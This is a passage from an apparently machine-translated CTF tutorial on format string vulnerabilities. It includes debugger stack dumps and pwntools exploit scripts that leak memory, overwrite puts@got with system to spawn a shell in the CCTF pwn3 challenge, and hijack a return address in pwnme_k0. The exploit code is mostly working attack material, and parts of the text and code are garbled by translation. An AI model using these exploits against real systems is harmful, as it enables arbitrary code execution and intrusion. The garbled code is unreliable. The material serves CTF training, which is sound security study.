<span class="s1">28 printf.c: There is no such file or directory.</span>


<span class="s1">─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────</span>

<span class="s1">   0x7ffff7a627f7 &lt;fprintf+135&gt;    add    rsp, 0xd8</span>

<span class="s1">0x7ffff7a627fe &lt;fprintf+142&gt; right</span>
<span class="s1">   0x7ffff7a627ff                  nop    </span>

<span class="s1"> → 0x7ffff7a62800 &lt;printf+0&gt;       sub    rsp, 0xd8</span>

<span class="s1">0x7ffff7a62807 &lt;printf+7&gt; test al, al</span>
<span class="s1">0x7ffff7a62809 &lt;printf+9&gt; mov QWORD PTR [rsp + 0x28], rsi</span>
<span class="s1">0x7ffff7a6280e &lt;printf+14&gt; mov QWORD PTR [rsp + 0x30], rdx</span>
<span class="s1">───────────────────────────────────────────────────────────────────────[ stack ]────</span>

<span class="s1">[&#39;</span>0x7fffffffdb08<span class="s1">&#39;, &#39;</span>l8<span class="err">&#39;</span><span class="o">]</span>

<span class="m">8</span>

0x00007fffffffdb08│+0x00: 0x0000000000400890  →  &lt;main+234&gt; mov edi, 0x4009b8    ← <span class="nv">$rsp</span>

0x00007fffffffdb10│+0x08: 0x0000000031000001

0x00007fffffffdb18│+0x10: 0x0000000000602830  →  0x0000363534333231 <span class="o">(</span><span class="s2">&quot;123456&quot;</span>?<span class="o">)</span>

0x00007fffffffdb20│ + 0x18: 0x0000000000602010 → <span class="p">&amp;</span>quot<span class="p">;</span>You answered: <span class="se">\ </span>ng<span class="p">&amp;</span>quot<span class="p">;</span>
0x00007fffffffdb28│+0x20: 0x00007fffffffdb30  →  <span class="s2">&quot;flag{11111111111111111&quot;</span>

0x00007fffffffdb30│+0x28: <span class="s2">&quot;flag{11111111111111111&quot;</span>

0x00007fffffffdb38│+0x30: <span class="s2">&quot;11111111111111&quot;</span>

0x00007fffffffdb40│+0x38: 0x0000313131313131 <span class="o">(</span><span class="s2">&quot;111111&quot;</span>?<span class="o">)</span>

──────────────────────────────────────────────────────────────────────────────<span class="o">[</span> trace <span class="o">]</span>────

<span class="o">[</span><span class="c1">#0] 0x7ffff7a62800 → Name: __printf(format=0x602830 &quot;123456&quot;)</span>

<span class="o">[</span><span class="c1">#1] 0x400890 → Name: main()</span>

─────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre></div>
<p>It can be seen that the offset on the stack corresponding to the flag is 5, and the offset is 4 except for the corresponding first behavior return address. In addition, since this is a 64-bit program, the first 6 parameters exist in the corresponding registers, and the fmt string is stored in the RDI register, so the offset of the address corresponding to the fmt string is 10. The order corresponding to <code>%order$s</code> in the fmt string is the order of the arguments after the fmt string, so we only need to type <code>%9$s</code> to get the contents of the flag. Of course, we have an easier way to use fmtarg in <a href="https://github.com/scwuaptx/Pwngdb">https://github.com/scwuaptx/Pwngdb</a> to determine the offset of a parameter.</p>
<div class="highlight"><pre><span></span><code>gef➤  fmtarg 0x00007fffffffdb28

The index of format argument : <span class="m">10</span>
</code></pre></div>
<p>Note that we have to break at printf.</p>
<h4 id="using-the-program">Using the program<a class="headerlink" href="#using-the-program" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">goodluck</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./goodluck&#39;</span><span class="p">)</span>

<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>

    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.sniperoj.cn&#39;</span><span class="p">,</span> <span class="mi">30017</span><span class="p">)</span>

<span class="k">else</span><span class="p">:</span>

    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./goodluck&#39;</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;%9$s&quot;</span>

<span class="nb">print</span> <span class="n">payload</span>

<span class="c1">##gdb.attach(sh)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="nb">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<h2 id="hijack-got">hijack GOT<a class="headerlink" href="#hijack-got" title="Permanent link">&para;</a></h2>
<h3 id="principle_1">Principle<a class="headerlink" href="#principle_1" title="Permanent link">&para;</a></h3>
<p>In the current C program, the functions in libc are all jumped through the GOT table. In addition, the GOT entry corresponding to each libc function can be modified without enabling RELRO protection. Therefore, we can modify the GOT table content of one libc function to the address of another libc function to achieve control of the program. For example, we can modify the contents of the got item of printf to the address of the system function. Thus, the program actually executes the system function when it executes printf.</p>
<p>Suppose we override the address of function A as the address of function B, then this attack technique can be divided into the following steps.</p>
<ul>
<li>
<p>Determine the GOT table address of function A.</p>
</li>
<li>
<p>The function A we used in this step is usually in the program, so we can find it by simply finding the address.</p>
</li>
<li>
<p>Determine the memory address of function B</p>
</li>
<li>
<p>This step usually requires us to find a way to leak the address of the corresponding function B.</p>
</li>
<li>
<p>Write the memory address of function B to the GOT table address of function A.</p>
</li>
<li>
<p>This step generally requires us to use the vulnerability of the function to trigger. The general use methods are as follows</p>
</li>
<li>
<p>Write function: write function.</p>
</li>
<li>
<p>ROP</p>
<div class="codehilite"><pre><span></span><code>```text

pop eax; ret;           # printf@got -&gt; eax

pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx

add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset

```
</code></pre></div>

</li>
<li>
<p>Format string to write at any address</p>
</li>
</ul>
<h3 id="examples_1">Examples<a class="headerlink" href="#examples_1" title="Permanent link">&para;</a></h3>
<p>Here we take [pwn3] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3</a>) in the 2016 CCTF as an example.</p>
<h4 id="determining-protection_1">Determining protection<a class="headerlink" href="#determining-protection_1" title="Permanent link">&para;</a></h4>
<p>as follows</p>
<div class="highlight"><pre><span></span><code>➜  <span class="m">2016</span>-CCTF-pwn3 git:<span class="o">(</span>master<span class="o">)</span> ✗ checksec pwn3 

    Arch:     i386-32-little

    RELRO:    Partial RELRO

    Stack:    No canary found

    NX:       NX enabled

    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
</code></pre></div>
<p>It can be seen that the program mainly turns on NX protection. We generally turn on ASLR protection by default.</p>
<h4 id="_2">分析程序<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h4>
<p>First analyze the program, you can find that the program seems to mainly implement a password-registered ftp, with three basic functions: get, put, dir. Probably look at the code for each feature and find a format string vulnerability in the get function.</p>
<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="nf">get_file</span><span class="p">()</span>

<span class="p">{</span>

  <span class="kt">char</span> <span class="n">dest</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-FCh]@5</span>

  <span class="kt">char</span> <span class="n">s1</span><span class="p">;</span> <span class="c1">// [sp+E4h] [bp-34h]@1</span>

  <span class="kt">char</span> <span class="o">*</span><span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+10Ch] [bp-Ch]@3</span>



  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;enter the file name you want to get:&quot;</span><span class="p">);</span>

  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%40s&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s1</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s1</span><span class="p">,</span> <span class="s">&quot;flag&quot;</span><span class="p">,</span> <span class="mi">4u</span><span class="p">)</span> <span class="p">)</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;too young, too simple&quot;</span><span class="p">);</span>

  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">file_head</span><span class="p">;</span> <span class="n">i</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">i</span> <span class="o">+</span> <span class="mi">60</span><span class="p">)</span> <span class="p">)</span>

  <span class="p">{</span>

    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s1</span><span class="p">)</span> <span class="p">)</span>

    <span class="p">{</span>

<span class="n">strcpy</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">dest</span><span class="p">,</span> <span class="n">i</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
<span class="k">return</span> <span class="n">printf</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">dest</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="p">}</span>

<span class="k">return</span> <span class="n">printf</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">dest</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
<h4 id="exploiting-ideas">Exploiting ideas<a class="headerlink" href="#exploiting-ideas" title="Permanent link">&para;</a></h4>
<p>Since there is a format string vulnerability, we can determine the following ideas</p>
<ul>
<li>Bypass password</li>
<li>Determine formatting string parameter offset</li>
<li>Use put@got to get the put function address, and then get the corresponding version of libc.so, and then get the corresponding system function address.</li>
<li>Modify the contents of puts@got to the address of system.</li>
<li>When the program executes the puts function again, it actually executes the system function.</li>
</ul>
<h4 id="vulnerability-program">Vulnerability Program<a class="headerlink" href="#vulnerability-program" title="Permanent link">&para;</a></h4>
<p>as follows</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>

<span class="c1">##context.log_level = &#39;debug&#39;</span>

<span class="n">pwn3</span> <span class="o">=</span> <span class="n">ELF</span> <span class="p">(</span><span class="o">&amp;</span><span class="c1">#39;./pwn3&amp;#39;)</span>
<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>

    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;111&#39;</span><span class="p">,</span> <span class="mi">111</span><span class="p">)</span>

<span class="k">else</span><span class="p">:</span>

    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn3&#39;</span><span class="p">)</span>





<span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;get&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;enter the file name you want to get:&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

    <span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">data</span>





<span class="k">def</span> <span class="nf">put</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;put&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;please enter the name of the file you want to upload:&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;then, enter the content:&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>





<span class="k">def</span> <span class="nf">show_dir</span><span class="p">():</span>

<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span> <span class="o">&amp;</span><span class="c1">#39;you&amp;#39;)</span>




<span class="n">tmp</span> <span class="o">=</span> <span class="s1">&#39;sysbdmin&#39;</span>

<span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tmp</span><span class="p">:</span>

    <span class="n">name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>





<span class="c1">## password</span>

<span class="k">def</span> <span class="nf">password</span><span class="p">():</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Name (ftp.hacker.server:Rainism):&#39;</span><span class="p">)</span>

    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>





<span class="c1">##password</span>

<span class="n">password</span><span class="p">()</span>

<span class="c1">## get the addr of puts</span>
<span class="n">puts_got</span> <span class="o">=</span> <span class="n">pwn3</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;puts got : &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_got</span><span class="p">))</span>

<span class="n">put</span><span class="p">(</span><span class="s1">&#39;1111&#39;</span><span class="p">,</span> <span class="s1">&#39;%8$s&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">))</span>

<span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;1111&#39;</span><span class="p">)[:</span><span class="mi">4</span><span class="p">])</span>



<span class="c1">## get addr of system</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s2">&quot;puts&quot;</span><span class="p">,</span> <span class="n">puts_addr</span><span class="p">)</span>

<span class="n">system_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>

<span class="n">puts_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>

<span class="n">system_addr</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">puts_offset</span> <span class="o">+</span> <span class="n">system_offset</span>

<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;system addr : &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>



<span class="c1">## modify puts@got, point to system_addr</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">puts_got</span><span class="p">:</span> <span class="n">system_addr</span><span class="p">})</span>

<span class="n">put</span><span class="p">(</span><span class="s1">&#39;/bin/sh;&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;ftp&gt;&#39;</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;get&#39;</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;enter the file name you want to get:&#39;</span><span class="p">)</span>

<span class="c1">##gdb.attach(sh)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh;&#39;</span><span class="p">)</span>



<span class="c1">## system(&#39;/bin/sh&#39;)</span>

<span class="n">show_dir</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
<p>note</p>
<ul>
<li>The offset I used when getting the address of the puts function is 8, because I want the first 4 bytes of my output to be the address of the puts function. In fact, the offset of the first address of the format string is 7.</li>
<li>Here I used the fmtstr_payload function in pwntools to get the results we hoped for. If you are interested, you can check the official documentation. For example, here fmtstr_payload(7, {puts_got: system_addr}) means that the offset of my format string is 7, I want to write the system_addr address at the puts_got address. By default it is written in bytes.</li>
</ul>
<h2 id="hijack-retaddr">hijack retaddr<a class="headerlink" href="#hijack-retaddr" title="Permanent link">&para;</a></h2>
<h3 id="principle_2">Principle<a class="headerlink" href="#principle_2" title="Permanent link">&para;</a></h3>
<p>It&#39;s easy to understand that we&#39;re going to use the format string vulnerability to hijack the return address of the program to the address we want to execute.</p>
<h3 id="examples_2">Examples<a class="headerlink" href="#examples_2" title="Permanent link">&para;</a></h3>
<p>Here we take [three white hat-pwnme_k0] (<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/three">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/three</a> white hats-pwnme_k0) as an example for analysis.</p>
<h4 id="determining-protection_2">Determining protection<a class="headerlink" href="#determining-protection_2" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code>➜ Three white hats - pwnme_k0 git: <span class="o">(</span>master<span class="o">)</span> ✗ checksec pwnme_k0
    Arch:     amd64-64-little

    RELRO:    Full RELRO

    Stack:    No canary found

    NX:       NX enabled

    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
</code></pre></div>
<p>It can be seen that the program mainly opens NX protection and Full RELRO protection. This way we have no way to modify the got table of the program.</p>
<h4 id="_3">分析程序<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h4>
<p>A brief analysis, you know that the program seems to mainly implement a function similar to account registration, mainly modify the viewing function, and then found a format string vulnerability found in the viewing function.</p>
<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="n">__usercall</span> <span class="n">sub_400B07</span> <span class="err">@</span> <span class="o">&lt;</span><span class="n">eax</span><span class="o">&gt;</span> <span class="p">(</span><span class="kt">char</span> <span class="n">format</span> <span class="err">@</span> <span class="o">&lt;</span><span class="n">dil</span><span class="o">&gt;</span> <span class="p">,</span> <span class="kt">char</span> <span class="n">formata</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a3</span><span class="p">,</span> <span class="kt">char</span> <span class="n">a4</span><span class="p">)</span>
<span class="p">{</span>

  <span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&quot;Welc0me to sangebaimao!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="mh">0x1AuLL</span><span class="p">);</span>

<span class="n">printf</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">formatata</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">quot</span><span class="p">;</span><span class="n">Welc0me</span> <span class="n">to</span> <span class="n">sangebaimao</span><span class="o">!</span> <span class="err">\</span> <span class="n">n</span><span class="o">&amp;</span><span class="n">quot</span><span class="p">;);</span>
<span class="k">return</span> <span class="n">printf</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">a4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
<p>The output is &amp;a4 + 4. Let’s go back and find out that the password we read in is also</p>
<div class="highlight"><pre><span></span><code>    <span class="n">v6</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">a4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x14uLL</span><span class="p">);</span>
</code></pre></div>
<p>Of course, we can also find that the username we read in is 20 bytes from the password.</p>
<div class="highlight"><pre><span></span><code>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Input your username(max lenth:20): &quot;</span><span class="p">);</span>

  <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

  <span class="n">v8</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bufa</span><span class="p">,</span> <span class="mh">0x14uLL</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span> <span class="n">v8</span> <span class="o">&amp;&amp;</span> <span class="n">v8</span> <span class="o">&lt;=</span> <span class="mh">0x14u</span> <span class="p">)</span>

  <span class="p">{</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Input your password(max lenth:20): &quot;</span><span class="p">);</span>

    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

    <span class="n">v6</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">a4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x14uLL</span><span class="p">);</span>

    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

<span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span> <span class="o">=</span> <span class="n">bufa</span><span class="p">;</span>
<span class="o">*</span> <span class="p">(</span><span class="n">_</span> <span class="n">QWORD</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="n">a4</span><span class="p">;</span>
</code></pre></div>
<p>Ok, this is almost the same. In addition, you can also find that this account password is not paired and not paired.</p>
<h4 id="using-ideas">Using ideas<a class="headerlink" href="#using-ideas" title="Permanent link">&para;</a></h4>
<p>Our ultimate goal is to get the system&#39;s shell. We can find that in the given file, there is a function that directly calls system(&#39;bin/sh&#39;) at the address 0x00000000004008A6 (about this discovery, generally the program is now roughly take a look.). Then if we modify the return address of a function to this address, it is equivalent to getting the shell.</p>
<p>Although the memory that stores the return address itself is dynamically changing, its address relative to rbp does not change, so we can use the relative address to calculate. Use ideas as follows</p>
<ul>
<li>Determine the offset</li>
<li>Get the rbp and return address of the function</li>
<li>Get the address where the return address is stored based on the relative offset</li>
<li>Write the address of the execution system function call to the address where the return address is stored.</li>
</ul>
<h4 id="determining-the-offset_1">Determining the offset<a class="headerlink" href="#determining-the-offset_1" title="Permanent link">&para;</a></h4>
<p>First, let&#39;s first determine the offset. Enter the user name aaaaaaaa, enter the password casually, at the printf(&amp;a4 + 4) function that outputs the password under the breakpoint.</p>
<div class="highlight"><pre><span></span><code>Register Account first!

Input your username(max lenth:20): 

aaaaaaaa

Input your password(max lenth:20): 

%p%p%p%p%p%p%p%p%p%p

Register Success!!

1.Sh0w Account Infomation!

2.Ed1t Account Inf0mation!

3.QUit sangebaimao:(

&gt;error options

1.Sh0w Account Infomation!

2.Ed1t Account Inf0mation!

3.QUit sangebaimao:(

&gt;1

...
</code></pre></div>
<p>At this point the stack is</p>
<div class="highlight"><pre><span></span><code>─────────────────────────────────────────────────────────[ code:i386:x86-64 ]────

     0x400b1a                  call   0x400758

0x400b1fe rdi, [rbp + 0x10]
     0x400b23                  mov    eax, 0x0

 →   0x400b28                  call   0x400770

   ↳    0x400770                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc0

0x400776 xchg ax, ax
        0x400778                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc8

0x40077e xchg ax, ax
────────────────────────────────────────────────────────────────────[ stack ]────

0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15     ← $rsp, $rbp

0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30

0x00007fffffffdb50│+0x10: &quot;aaaaaaaa&quot;     ← $rdi

0x00007fffffffdb58│+0x18: 0x000000000000000a

0x00007fffffffdb60│+0x20: 0x7025702500000000

0x00007fffffffdb68│+0x28: &quot;%p%p%p%p%p%p%p%pM\r@&quot;

0x00007fffffffdb70│+0x30: &quot;%p%p%p%pM\r@&quot;

0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
</code></pre></div>
<p>We can find that the user name we entered is in the third position on the stack, then the position of the format string itself is removed, and the offset is 5 + 3 = 8.</p>
<h4 id="change-address">Change address<a class="headerlink" href="#change-address" title="Permanent link">&para;</a></h4>
<p>We will carefully observe the information of the stack at the breakpoint.</p>
<div class="highlight"><pre><span></span><code>0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15     ← $rsp, $rbp

0x00007fffffffdb48│+0x08: 0x0000000000400d74  →   add rsp, 0x30

0x00007fffffffdb50│+0x10: &quot;aaaaaaaa&quot;     ← $rdi

0x00007fffffffdb58│+0x18: 0x000000000000000a

0x00007fffffffdb60│+0x20: 0x7025702500000000

0x00007fffffffdb68│+0x28: &quot;%p%p%p%p%p%p%p%pM\r@&quot;

0x00007fffffffdb70│+0x30: &quot;%p%p%p%pM\r@&quot;

0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
</code></pre></div>
<p>You can see that the second location on the stack stores the return address of the function (in fact, the value stored in the push rip when the show account function is called), and the offset in the format string is 7.</p>
<p>At the same time, on the stack, the first element stores the rbp of the previous function. So we can get the offset 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38. Then if we know the value of rbp, we know the address of the function return address.</p>
<p>0x0000000000400d74 is different from 0x00000000004008A6 with only 2 bytes lower, so we can only modify 2 bytes starting at 0x00007fffffffdb48.</p>
<p>It should be noted here that on some newer systems (such as ubuntu 18.04), the program crash may occur when the return address is directly modified to 0x00000000004008A6. In this case, you can consider modifying the return address to 0x00000000004008AA, that is, directly calling system(&quot;/bin /sh&quot;)</p>
<div class="highlight"><pre><span></span><code>.text:00000000004008A6 sub_4008A6      proc near

.text:00000000004008A6 ; __unwind {

.text:00000000004008A6                 push    rbp

.text:00000000004008A7                 mov     rbp, rsp

.text:00000000004008AA &lt;- here         mov     edi, offset command ; &quot;/bin/sh&quot;

.text:00000000004008AF                 call    system

.text:00000000004008B4                 pop     rdi

.text:00000000004008B5                 pop     rsi

.text:00000000004008B6                 pop     rdx

.text: 00000000004008B7 retn
</code></pre></div>
<h4 id="using-the-program_1">Using the program<a class="headerlink" href="#using-the-program_1" title="Permanent link">&para;</a></h4>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;debug&quot;</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s2">&quot;amd64&quot;</span>



<span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&quot;./pwnme_k0&quot;</span><span class="p">)</span>

<span class="n">binary</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;pwnme_k0&quot;</span><span class="p">)</span>

<span class="c1">#gdb.attach(sh)</span>



<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s2">&quot;%6$p&quot;</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">sh</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;0x&quot;</span><span class="p">)</span>

<span class="n">ret_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x38</span>

